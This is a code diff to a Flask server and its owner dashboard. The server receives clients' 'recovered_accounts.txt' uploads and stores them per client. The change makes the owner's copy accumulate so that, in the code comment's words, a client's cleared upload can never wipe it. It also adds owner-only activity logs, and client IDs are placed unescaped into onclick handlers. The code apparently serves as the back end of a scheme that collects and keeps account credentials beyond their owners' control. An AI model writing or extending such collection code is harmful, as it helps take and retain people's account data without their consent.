@@ -1020,6 +1020,30 @@ def _safe_client_folder(cid):
     return re.sub(r'[^A-Za-z0-9_-]', '_', cid) or "client"
 
 
+def _account_blocks(text):
+    """Split recovered_accounts.txt content into individual account blocks,
+    each starting with the '--- Recovered Account' marker."""
+    blocks = []
+    for part in (text or "").split("--- Recovered Account")[1:]:
+        block = ("--- Recovered Account" + part).rstrip()
+        if block.strip():
+            blocks.append(block)
+    return blocks
+
+
+def _log_client_event(cid, message):
+    """Append a timestamped activity line to the client's log (owner side)."""
+    try:
+        from datetime import datetime
+        folder = os.path.join(COLLECTOR_DIR, _safe_client_folder(cid))
+        os.makedirs(folder, exist_ok=True)
+        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        with open(os.path.join(folder, "activity.log"), "a", encoding="utf-8") as f:
+            f.write(f"[{ts}] {message}\n")
+    except Exception:
+        pass
+
+
 @app.route('/api/collect', methods=['POST'])
 def api_collect():
     """Receive a client's recovered_accounts.txt and save it under
@@ -1035,20 +1059,38 @@ def api_collect():
     if not c.get("enabled", True):
         return jsonify({"status": "disabled", "enabled": False,
                         "message": c.get("disabled_message") or "Your access has been disabled by the administrator."}), 200
-    # Save the client's file
+    # ACCUMULATE (never overwrite): merge the incoming accounts into what we
+    # already have and dedupe, so an empty/cleared client upload can never wipe
+    # the owner's collected copy.
     folder = os.path.join(COLLECTOR_DIR, _safe_client_folder(cid))
+    dest_file = os.path.join(folder, "recovered_accounts.txt")
     try:
         os.makedirs(folder, exist_ok=True)
-        with open(os.path.join(folder, "recovered_accounts.txt"), "w", encoding="utf-8") as f:
-            f.write(content)
+        existing = ""
+        if os.path.exists(dest_file):
+            with open(dest_file, "r", encoding="utf-8") as f:
+                existing = f.read()
+        prev_total = len(_account_blocks(existing))
+        seen, merged = set(), []
+        for block in _account_blocks(existing) + _account_blocks(content):
+            norm = " ".join(block.split())
+            if norm and norm not in seen:
+                seen.add(norm)
+                merged.append(block)
+        merged_text = ("\n\n".join(merged) + "\n") if merged else ""
+        with open(dest_file, "w", encoding="utf-8") as f:
+            f.write(merged_text)
+        total = len(merged)
+        if total > prev_total:
+            _log_client_event(cid, f"Recovered {total - prev_total} new account(s) — total {total}")
     except Exception as e:
         return jsonify({"status": "error", "message": f"Save failed: {e}"}), 500
-    # Update last-seen / count
+    # Update last-seen / cumulative count
     items = load_client_keys()
     for it in items:
         if it.get("client_id", "").lower() == cid.lower():
             it["last_seen"] = int(time.time())
-            it["last_count"] = content.count("--- Recovered Account")
+            it["last_count"] = total
     save_client_keys(items)
     return jsonify({"status": "success", "enabled": True})
 
@@ -1098,6 +1140,7 @@ def api_clients_toggle(cid):
     target["enabled"] = not target.get("enabled", True)
     save_client_keys(items)
     state = "enabled" if target["enabled"] else "disabled"
+    _log_client_event(cid, f"{state.capitalize()} by owner")
     return jsonify({"status": "success", "message": f"Client '{cid}' {state}.", "enabled": target["enabled"]})
 
 
@@ -1133,6 +1176,21 @@ def api_clients_download(cid):
         content = f.read()
     return Response(content, mimetype="text/plain; charset=utf-8",
                     headers={"Content-Disposition": f'attachment; filename="recovered_accounts_{_safe_client_folder(cid)}.txt"'})
+
+
+@app.route('/api/clients/<cid>/log', methods=['GET'])
+@owner_required
+@manager_required
+def api_clients_log(cid):
+    path = os.path.join(COLLECTOR_DIR, _safe_client_folder(cid), "activity.log")
+    lines = []
+    if os.path.exists(path):
+        try:
+            with open(path, "r", encoding="utf-8") as f:
+                lines = f.read().splitlines()[-300:]
+        except Exception:
+            pass
+    return jsonify({"client_id": cid, "lines": lines})
 
 
 def _client_stop_bot():
@@ -2582,6 +2640,19 @@ HTML_TEMPLATE = """
         </div>
     </div>
 
+    <!-- ===== Client activity log modal (owner) ===== -->
+    <div id="clientLogModal" class="modal-overlay" onclick="if(event.target===this)closeClientLog()">
+        <div class="modal-box">
+            <div class="modal-header">
+                <h2 id="client_log_title">Client activity</h2>
+                <button class="modal-close" onclick="closeClientLog()">&times;</button>
+            </div>
+            <div class="modal-body">
+                <pre id="client_log_body" style="max-height:55vh;overflow:auto;background:rgba(0,0,0,0.3);border:1px solid var(--border-color);border-radius:8px;padding:0.8rem;font-family:var(--font-mono);font-size:0.8rem;white-space:pre-wrap;color:var(--text-main);margin:0;">Loading…</pre>
+            </div>
+        </div>
+    </div>
+
     <!-- ===== Change password modal ===== -->
     <div id="passwordModal" class="modal-overlay" onclick="if(event.target===this)closePasswordModal()">
         <div class="modal-box" style="max-width:380px;">
@@ -3044,6 +3115,7 @@ HTML_TEMPLATE = """
                         '<td>' + timeAgo(c.last_seen) + '</td>' +
                         '<td>' + (c.last_count || 0) + '</td>' +
                         '<td>' +
+                            '<button class="row-action" onclick="viewClientLog(\\'' + c.client_id + '\\')">Log</button>' +
                             (c.last_count ? '<button class="row-action" onclick="downloadClient(\\'' + c.client_id + '\\')">Download</button>' : '') +
                             '<button class="row-action" onclick="toggleClient(\\'' + c.client_id + '\\')">' + toggleLabel + '</button>' +
                             '<button class="row-action danger" onclick="deleteClient(\\'' + c.client_id + '\\')">Delete</button>' +
@@ -3083,6 +3155,19 @@ HTML_TEMPLATE = """
             const a = document.createElement('a');
             a.href = '/api/clients/' + encodeURIComponent(id) + '/download';
             document.body.appendChild(a); a.click(); a.remove();
+        }
+        function viewClientLog(id) {
+            document.getElementById('client_log_title').textContent = 'Activity — ' + id;
+            document.getElementById('client_log_body').textContent = 'Loading…';
+            document.getElementById('clientLogModal').classList.add('open');
+            fetch('/api/clients/' + encodeURIComponent(id) + '/log').then(r => r.json()).then(d => {
+                const body = document.getElementById('client_log_body');
+                body.textContent = (d.lines && d.lines.length) ? d.lines.join('\\n') : 'No activity yet.';
+                body.scrollTop = body.scrollHeight;
+            }).catch(() => { document.getElementById('client_log_body').textContent = 'Failed to load log.'; });
+        }
+        function closeClientLog() {
+            document.getElementById('clientLogModal').classList.remove('open');
         }
 
         // ===== Auth: user management + password modals =====
